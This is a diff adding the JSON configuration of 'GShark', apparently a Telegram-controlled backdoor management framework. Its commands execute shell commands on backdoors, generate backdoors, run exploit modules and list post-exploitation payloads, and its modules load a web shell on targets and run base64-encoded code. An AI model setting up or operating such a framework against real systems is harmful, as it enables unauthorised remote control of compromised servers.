@@ -1,0 +1,132 @@
+{
+  "database": {
+    "hostname": "localhost",
+    "dbname"  : "gshark",
+    "username": "root",
+    "password": "root"
+  },
+  "telegram": {
+    "bot_id": ""
+  },
+  "structure": {
+    "core_folder":"/home/GSHARK/core/",
+    "output_folder":"/home/GSHARK/Output/"
+  },
+  "commands": {
+    "master": {
+      "/help"   :{
+        "type":"master",
+        "function" : "show_help",
+        "description":"show the help bullet"
+      },
+      "/start"  :{
+        "type":"master",
+        "function" : "masterWelcome",
+        "description":"start networking with GShark"
+      },
+      "/resume" :{
+        "type":"master",
+        "function" : "getResume",
+        "description":"resume current master"
+      },
+      "/exec"   :{
+        "type":"both",
+        "function" : "shellExecute",
+        "description":"execute <command> on backdoor e.g: /exec ls"
+      },
+      "/modules":{
+        "type":"master",
+        "function" : "showModules",
+        "description":"show avaiable modules"
+      },
+      "/use"    :{
+        "type":"master",
+        "function" : "useElement",
+        "description":"use selected module / payload "
+      },
+      "/set":{
+        "type":"master",
+        "function":"setModuleArgument",
+        "description":"set argument to current module"
+      },
+      "/getpayload":{
+        "type":"master",
+        "function":"getModulePayload",
+        "description":"retreive a payload from selected module"
+      },
+      "/generate": {
+        "type":"backdoor",
+        "function": "generateElement",
+        "description":"generate selected backdoor"
+      },
+      "/exploit":{
+        "type":"backdoor",
+        "function":"executeModule",
+        "description":"execute module for selected target"
+      },
+      "/reboot":{
+        "type":"master",
+        "function":"reboot",
+        "description":"reboot framework"
+      },
+      "/payload": {
+        "type":"backdoor",
+        "function":"listPayload",
+        "description":"show all post exploitation payload available"
+      },
+      "/list": {
+        "type":"both",
+        "function":"listElement",
+        "description":"list backdoor already installed"
+      },
+      "/interact": {
+        "type":"backdoor",
+        "function":"interactWith",
+        "description":"interact with backdoor indentifier"
+      },
+      "/ping": {
+        "type":"backdoor",
+        "function":"pingBackdoor",
+        "description":"check if backdoor is down or not"
+      },
+      "/target": {
+        "type":"backdoor",
+        "function":"showTarget",
+        "description":"show selected target"
+      },
+      "/config":{
+        "type":"master",
+        "function":"showConfigElement",
+        "description":"get/set/remove one config element e.g: /config get proxy"
+      },
+      "/remove":{
+        "type":"backdoor",
+        "function":"removeBackdoor",
+        "description":"remove connected backdoor identifier"
+      }
+    }
+  },
+  "modules": {
+    "execute": {
+      "name":"executeModule",
+      "description":"sample module"
+    },
+    "connect": {
+      "name":"connectModule",
+      "description":"add new target to GShark master"
+    },
+    "visual": {
+      "name":"visualShell",
+      "description":"load b347k shell on target"
+    }
+  },
+  "templates": {
+    "backdoor": [
+      {
+        "name": "Executor",
+        "filename": "Executor.tpl",
+        "description": "execute base64 encoded modules"
+      }
+    ]
+  }
+}
